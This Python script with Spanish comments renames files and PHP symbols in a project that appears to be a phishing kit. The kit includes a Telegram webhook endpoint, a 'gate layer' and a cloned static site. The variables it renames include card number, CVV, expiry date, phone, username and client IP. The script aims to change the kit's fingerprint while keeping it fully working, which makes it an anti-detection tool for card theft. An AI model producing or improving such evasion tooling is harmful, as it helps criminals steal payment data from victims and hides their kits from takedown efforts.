#!/usr/bin/env python3
"""
shuffle.py — Randomiza nombres de archivos y simbolos PHP del proyecto
sin tocar el flujo, visual ni funcionalidad.

Reglas:
  * NO toca turquia.php  (webhook Telegram ya registrado contra ese path)
  * NO toca el root index.php ni _lib.php (gate layer)
  * NO toca imagenes, csv, md, py, tpl, flags .wh_*
  * Backups con sufijo .bak NO se incluyen.
  * Un .tpl que tenga su hermano renombrado tambien se renombra en paralelo.
  * Reemplaza referencias literales (nombre de archivo) y simbolos PHP
    con limite de palabra para no estropear substrings.
"""
import os, re, sys, json, random, string, shutil, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent  # proo/
MANZANA = ROOT / "manzana"

# ---- codename pool ----
WORDS = [
    "ambar","astral","bauhaus","brevo","cuarzo","delfin","edelweiss","fiordo",
    "galena","halcon","ignis","jade","koala","liebre","mica","nebula","onix",
    "petunia","quimera","rombo","safiro","tundra","umbra","valkyr","welt",
    "xenon","yute","zafiro","alba","boreal","cedro","dalia","eco","flora",
    "garza","heno","inti","juno","kelp","lince","musgo","nilo","orion",
    "pampa","quilt","rune","selva","tilo","uvita","viento","yago","zorro",
    "amanecer","briz","copa","duna","esmer","faro","gleba","halo","iris",
    "jaspe","kappa","lira","maya","noto","ocaso","polen","quot","ratan",
    "sombra","troya","ulyses","vega","wolf","yunta","zenit",
]
random.shuffle(WORDS)
_pool = iter(WORDS)

def pop_word():
    w = next(_pool, None)
    if w is None:
        w = "x" + "".join(random.choices(string.ascii_lowercase, k=6))
    return w

# ---- archivos NO renombrables ----
SKIP_FILES = {
    "manzana/turquia.php",
    "manzana/oslo.php",            # muchos includes relativos, mantenemos
    "manzana/randomize.py",
    "manzana/BRANDING.md",
    "manzana/config.php",
    # root files
    "index.php","_lib.php","og-image.php",
}

RENAMEABLE_EXTS = {".php",".html",".css",".js"}

def collect_renames():
    rename = {}
    for p in MANZANA.rglob("*"):
        if not p.is_file(): continue
        rel = p.relative_to(ROOT).as_posix()
        if rel in SKIP_FILES: continue
        # Dejar el clone Out/ fuera (autocontenido, estatico)
        if "/Out/" in "/"+rel or rel.startswith("manzana/Out"): continue
        name = p.name
        # saltar .tpl, imagenes, flags
        if p.suffix.lower() in {".tpl",".svg",".png",".jpg",".jpeg",".gif",".ico",".mp4",".csv",".md",".py",".txt"}:
            continue
        if name.startswith(".wh_"): continue
        if p.suffix.lower() not in RENAMEABLE_EXTS: continue
        stem, ext = p.stem, p.suffix
        new_stem = pop_word()
        rename[name] = new_stem + ext
    return rename

# ---- simbolos PHP ----
VAR_RENAME = {
    "tk":           pop_word(),
    "ci":           pop_word(),
    "usuario":      pop_word(),
    "ip_cliente":   pop_word(),
    "mensaje":      pop_word(),
    "telegram_url": pop_word(),
    "botones":      pop_word(),
    "telefono":     "tele_"+pop_word()[:4],
    "tarjeta":      "trj_"+pop_word()[:4],
    "cvv":          "cv_"+pop_word()[:4],
    "fecha":        "fh_"+pop_word()[:4],
    "ar":           "ax_"+pop_word()[:3],
}
FUNC_RENAME = {
    "gip":  "ip_"+pop_word()[:5],
    "eat":  "tx_"+pop_word()[:5],
    "obtenerIPCliente": "cli_"+pop_word()[:5],
}

TEXT_EXTS = {".php",".html",".css",".js",".tpl",".tpl.php",".svg",".txt",".md"}

def is_text_file(p: Path) -> bool:
    return p.suffix.lower() in TEXT_EXTS or p.name.endswith(".js.tpl") or p.name.endswith(".html.tpl")

def replace_filenames(content: str, rename_map: dict) -> str:
    # Ordenar por longitud desc para evitar que 'uva.php' impacte antes que algo mas largo
    for old in sorted(rename_map, key=len, reverse=True):
        new = rename_map[old]
        # literal, pero con delimitadores alrededor para evitar colisiones de substring
        # usamos lookaround: no letra/numero/_/. antes, y asi evitamos matchear p.ej. 'xuva.php'
        pat = re.compile(r'(?<![A-Za-z0-9_])' + re.escape(old) + r'(?![A-Za-z0-9_])')
        content = pat.sub(new, content)
    return content

def replace_php_symbols(content: str) -> str:
    # variables PHP: $name  (word-bound)
    for old,new in VAR_RENAME.items():
        content = re.sub(r'\$' + re.escape(old) + r'\b', '$' + new, content)
    # funciones PHP: declaracion y llamada con limite de palabra
    for old,new in FUNC_RENAME.items():
        content = re.sub(r'\b' + re.escape(old) + r'\b(?=\s*\()', new, content)
        # declaracion: function old(
        content = re.sub(r'(function\s+)' + re.escape(old) + r'\b', r'\1' + new, content)
    return content

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    rename_map = collect_renames()
    print(f"[plan] renombrando {len(rename_map)} archivos")
    print(f"[plan] renombrando {len(VAR_RENAME)} variables PHP")
    print(f"[plan] renombrando {len(FUNC_RENAME)} funciones PHP")

    # 1. Reescribir contenido de TODOS los archivos de texto (incluye root)
    scan_roots = [ROOT]
    touched = 0
    for root in scan_roots:
        for p in root.rglob("*"):
            if not p.is_file(): continue
            if "proo_backup_" in p.as_posix(): continue
            if p.parent.name == "tools": continue
            # No reescribir el clone Out/
            if "/Out/" in p.as_posix().replace("\\","/"): continue
            if not is_text_file(p): continue
            try:
                orig = p.read_text(encoding="utf-8")
            except Exception:
                continue
            new = replace_filenames(orig, rename_map)
            if p.suffix.lower() == ".php" or p.name.endswith(".tpl") or p.name.endswith(".html"):
                # las plantillas .tpl generan .php/.html que tendran codigo
                new = replace_php_symbols(new)
            if new != orig:
                touched += 1
                if not args.dry_run:
                    p.write_text(new, encoding="utf-8")
    print(f"[edit] archivos de texto modificados: {touched}")

    # 2. Renombrar archivos fisicos
    renamed = 0
    for old_name, new_name in rename_map.items():
        # buscar la ruta real
        matches = list(MANZANA.rglob(old_name))
        matches = [m for m in matches if "proo_backup_" not in m.as_posix() and "/Out/" not in m.as_posix().replace("\\","/") and m.is_file()]
        for m in matches:
            dst = m.with_name(new_name)
            if args.dry_run:
                print(f"  rename {m.relative_to(ROOT)} -> {new_name}")
            else:
                m.rename(dst)
            renamed += 1
    print(f"[rename] archivos renombrados: {renamed}")

    # 3. Guardar log de mapeo
    log = {
        "files": rename_map,
        "vars": VAR_RENAME,
        "funcs": FUNC_RENAME,
    }
    log_path = ROOT / "tools" / "shuffle_mapping.json"
    if not args.dry_run:
        log_path.write_text(json.dumps(log, indent=2), encoding="utf-8")
        print(f"[log] guardado en {log_path}")

if __name__ == "__main__":
    main()
